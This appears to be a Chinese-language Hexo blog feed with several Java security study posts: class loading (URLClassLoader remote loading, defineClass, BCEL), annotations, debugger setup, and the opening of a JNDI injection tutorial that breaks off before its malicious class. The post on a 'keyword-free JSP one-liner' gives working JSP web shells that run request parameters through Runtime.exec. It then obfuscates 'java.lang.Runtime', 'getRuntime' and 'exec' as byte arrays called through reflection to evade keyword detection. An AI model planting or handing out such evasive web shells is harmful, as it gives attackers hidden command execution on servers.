<p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。 </p>
<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这 些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台 的JVM虚拟机中。</p>
<p> 甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文 件，都可以在JVM虚拟机中运行：</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220323213706173.png" alt="image-20220323213706173"></p>
<p>通常所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加 载的字节序列</p>
<h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><p><code>URLClassLoader </code>实际上是我们平时默认使用的 <code>AppClassLoader </code>的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p>
<p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况： </p>
<ul>
<li><p>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件 </p>
</li>
<li><p>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件 </p>
</li>
<li><p>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 </p>
</li>
</ul>
<p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。</p>
<p>使用python搭建一个简易Http服务器,将class文件放在服务器上面,尝试加载</p>
<p><code>python3 -m http.server 5555</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://xxxxxxxxxxx:5555/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        test.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以，作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。</p>
<h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><p>其实,不管是远程加载class文件还是本地的class或者Jar文件,经历的欧式下面这三个方法的调用</p>
<p><code>loadClass</code>—&gt;<code>findClass</code>—&gt;<code>defineClass</code></p>
<ul>
<li><p>其中： loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 </p>
</li>
<li><p>findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass </p>
</li>
<li><p>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</p>
</li>
</ul>
<p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass</code> 是一个native方法，逻辑在JVM的C语言代码中。\</p>
<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。</p>
<p>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
<h5 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String TestName=<span class="string">&quot;demo1.HelloWorld&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(TestName))</span><br><span class="line">            <span class="keyword">return</span> defineClass(TestName,testClassBytes,<span class="number">0</span>,testClassBytes.length);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TestClassLoader loader=<span class="keyword">new</span> TestClassLoader();</span><br><span class="line">        Class&lt;?&gt; testClass = loader.loadClass(TestName);</span><br><span class="line">        <span class="comment">//虽然在自定义classLoader中加载的是testClassBytes中的数据,但是在这里获取到Class后,在newInstance的时候用的是当前包下面对应的java文件中的class</span></span><br><span class="line">        Object newInstance = testClass.newInstance();</span><br><span class="line">        Method hello = newInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        String str=(String)hello.invoke(newInstance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>字节数组中存的数据对应的类代码:</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423154839887.png" alt="image-20220423154839887"></p>
<p>当前对应包名下面真正的类代码</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423154723513.png" alt="image-20220423154723513"></p>
<p>newInstance出来对应的是后者,变量名也都存在,这里存在被修改的可能</p>
<p>同时加载的两个类是否相等,不仅仅由类的路径来决定,还需要是同一个类加载器加载的才能被判断为相等</p>
<p>比如有两个ClassLoader A和B</p>
<p><code>ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射</code>。</p>
<h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为 被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的 原生库中。</p>
<p>我们可以通过BCEL提供的两个类<code> Repository</code> 和<code>Utility</code>来利用： <code>Repository </code>用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将 原生的字节码转换成BCEL格式的字节码：</p>
<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的<code> TemplatesImpl</code> 都出自于同一个第三方库，Apache Xalan。但是由于各种原因，在Java 8u251的更新中，这个ClassLoader被移除了.</p>
<p>待续…..</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java注解</title>
    <url>/2022/01/11/java%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="注解-Annotation"><a href="#注解-Annotation" class="headerlink" title="注解(Annotation)"></a>注解(Annotation)</h2><span id="more"></span>

<h3 id="注解简介"><a href="#注解简介" class="headerlink" title="注解简介"></a>注解简介</h3><h5 id="注解的作用"><a href="#注解的作用" class="headerlink" title="注解的作用:"></a>注解的作用:</h5><ul>
<li>不是程序本身,可以对程序做出解释,也能对程序的正确性进行矫正(比如写了@Override就要重写)</li>
<li>可以被其他程序(比如编译器等)读取</li>
</ul>
<h5 id="注解的格式"><a href="#注解的格式" class="headerlink" title="注解的格式:"></a>注解的格式:</h5><p>注解是以”@注解名”在代码中存在的,还可以添加一些参数值,例如:@SuppressWarnings(Value=”unchecked”)</p>
<h5 id="注解在哪里使用"><a href="#注解在哪里使用" class="headerlink" title="注解在哪里使用"></a>注解在哪里使用</h5><p>可以附加在package,class,method,field等上面,相当于给他们添加了额外的辅助信息,我们可以通过反射机制编程实现对这些元数据的访问</p>
<h3 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h3><h5 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h5><p>定义在java.long.Override中,用于修饰方法,表示一个方法声明打算重写</p>
<h5 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h5><p>定义在java.long.Deprecated中,此注释可以用于修饰方法,属性类,表示不鼓励程序员使用这一的元素,通过是一万年它很危险或者存在更好的选择</p>
<h5 id="SuppressWarnings"><a href="#SuppressWarnings" class="headerlink" title="@SuppressWarnings"></a>@SuppressWarnings</h5><p>定义在java.long.SuppressWarnings中,用来抑制编译时的警告信息,它需要添加一个参数才能使用</p>
<p>例如:</p>
<ul>
<li><p>@SuppressWarnings(“all”)</p>
</li>
<li><p>@SuppressWarnings(“unchecked”)</p>
</li>
<li><p>@SuppressWarnings(value={“unchecked”,”deprecation”})</p>
</li>
</ul>
<p>能传递多个参数源自于其源码中的最后一行</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220111133538313.png" alt="image-20220111133538313" style="zoom:80%;" />

<ul>
<li>…….</li>
</ul>
<h3 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h3><p>元注解的作用就是解释其他注解,java定义了四个标准的元注解(meta_annotation)</p>
<ul>
<li>@Target </li>
</ul>
<p>用于表示注解的使用范围</p>
<p>​                              @Target(ElementType.TYPE)   //接口、类、枚举</p>
<p>　　　　　　　　@Target(ElementType.FIELD) //字段、枚举的常量</p>
<p>　　　　　　　　@Target(ElementType.METHOD) //方法</p>
<p>　　　　　　　　@Target(ElementType.PARAMETER) //方法参数</p>
<p>　　　　　　　　@Target(ElementType.CONSTRUCTOR)  //构造函数</p>
<p>　　　　　　　　@Target(ElementType.LOCAL_VARIABLE)//局部变量</p>
<p>　　　　　　　　@Target(ElementType.ANNOTATION_TYPE)//注解</p>
<p>　　　　　　　　@Target(ElementType.PACKAGE) ///包   </p>
<ul>
<li>@Retention</li>
</ul>
<p>表示需要在什么级别保存该注释信息,用于描述注解的声明周期</p>
<p>Runtime&gt;class&gt;source</p>
<ul>
<li>@Documented</li>
</ul>
<p>说明该注解将被包含在javadoc中</p>
<ul>
<li>@Inherited</li>
</ul>
<p>说明子类可以继承父类中的该注解</p>
<h3 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h3><p>使用@interface自定义注解,自动继承java.lang.annotation.Annotation接口</p>
<ul>
<li>格式</li>
</ul>
<p>public @ interface 注解名 {定义内容}</p>
<ul>
<li><p>其中的每一个方法实际上是声明了一个配置参数</p>
</li>
<li><p>方法的名称就是参数的名称</p>
</li>
<li><p>返回值类型就是参数的类型(返回值只能是Class,String,enum)</p>
</li>
<li><p>可以通过default来声明参数的默认值</p>
</li>
<li><p>如果只有一个参数成员,一般参数名为value<label style="color:red">(value参数可以省略传参)</label></p>
</li>
<li><p>注解元素必须要有值,我们定义注解元素时,经常使用空字符串,0作为默认值</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="meta">@myAnnotation(Class = &quot;不写默认就是一班二班&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> myAnnotation&#123;</span><br><span class="line">    <span class="comment">//注解的参数:参数类型+参数名();</span></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;lol&quot;</span>;<span class="comment">//定义了注解的参数就要传参,也可以通过default定义不传参时默认情况下的参数</span></span><br><span class="line">    String [] Class() <span class="keyword">default</span> &#123;<span class="string">&quot;一班&quot;</span>,<span class="string">&quot;二班&quot;</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java调试环境配置</title>
    <url>/2022/03/09/java%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>java代码调试环境配置<span id="more"></span></p>
<p>首先需要有对应版本的jdk文件,由于windows上的jdk都是exe,所以可以让它安装到虚拟机里面,再把安装的jdk文件夹拷贝出来</p>
<p>然后去下载对应版本的openjdk</p>
<p>参照这篇文章进行操作<a href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
<p>解压jdk中的src压缩包</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220311225711001.png" alt="image-20220311225711001"></p>
<p>将<code>openjdk</code>中<code>src\share\classes</code>目录下的sun文件夹复制到<code>jdk</code>src目录中</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220311225744162.png" alt="image-20220311225744162"></p>
<p>接着在idea中将<code>src</code>目录添加到</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220311230642856.png" alt="image-20220311230642856"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
  </entry>
  <entry>
    <title>jsp无关键字一句话</title>
    <url>/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
    <content><![CDATA[<h2 id="jsp无关键字一句话"><a href="#jsp无关键字一句话" class="headerlink" title="jsp无关键字一句话"></a>jsp无关键字一句话</h2><p>通过ascii码与字符之间的转换,加上通过反射加载类,实现无关键字一句话</p>
<h4 id="py脚本script-str2ascii"><a href="#py脚本script-str2ascii" class="headerlink" title="py脚本script_str2ascii"></a>py脚本<code>script_str2ascii</code></h4><p>首先写一个简单的py脚本,转换命令为byte数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="built_in">input</span>(<span class="string">&quot;input code&quot;</span>)</span><br><span class="line">arr=[]</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">    arr.append(<span class="built_in">ord</span>(char))</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure>

<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>接下来找一个简单的小马,进行改造</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="comment">//加一个系统的判断</span></span><br><span class="line">    String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">    BufferedReader bufferedReader;</span><br><span class="line">    <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String len;</span><br><span class="line">        <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="通过反射改变获取类并执行的方式"><a href="#通过反射改变获取类并执行的方式" class="headerlink" title="通过反射改变获取类并执行的方式"></a>通过反射改变获取类并执行的方式</h4><p>主要目的是将runtime相关的类和函数通过反射进行修改</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    Method method = aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    Method method1 = aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    method1.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>通过反射加载runtime类的方式可行,并且成功弹出了计算器</p>
<p>接下来通过ascii数组,替换其中比较敏感的字符串</p>
<p>上面那个小马里面别的不关键的东西懒得写了…..</p>
<p><strong>这里可以使用byte数组,原因是当前涉及到的字符串中的所有字符ascii码均在127以下</strong></p>
<h4 id="加入byte数组"><a href="#加入byte数组" class="headerlink" title="加入byte数组"></a>加入byte数组</h4><p>通过byte数组修饰以下关键字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">byte</span>[] a=&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="keyword">new</span> String(a));<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    <span class="keyword">byte</span>[] b=&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;;</span><br><span class="line">    Method method = aClass.getMethod(<span class="keyword">new</span> String(b));</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    <span class="keyword">byte</span>[] c=&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;;</span><br><span class="line">    Method method1 = aClass.getMethod(<span class="keyword">new</span> String(c), String.class);</span><br><span class="line">    method1.invoke(o,request.getParameter(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>一句话</tag>
      </tags>
  </entry>
  <entry>
    <title>jndi注入学习</title>
    <url>/2022/05/04/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h3><p>JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p>
<p>常见的命名/目录提供者</p>
<ul>
<li>RMI</li>
<li>LDAP</li>
<li>CORBA</li>
<li>DNS</li>
</ul>
<p>一个简单的例子开始JNDI的学习</p>
<p>首先编写并编译恶意class文件放到可访问的URL上,接着将其URL注册并绑定给该服务器某端口的RMI服务商</p>
<blockquote>
<p>这里有个问题,为什么不直接使用RMI来加载恶意类呢</p>
</blockquote>
<p>因为RMI它的特点是调用完结果是由RMI服务器去执行的,执行完的结果以序列化的形式传递给客户端,虽然可能存在反序列化的利用,但是不符合这里想要构造的远程加载恶意class文件并在客户端上面执行的思路</p>
<p>恶意类</p>
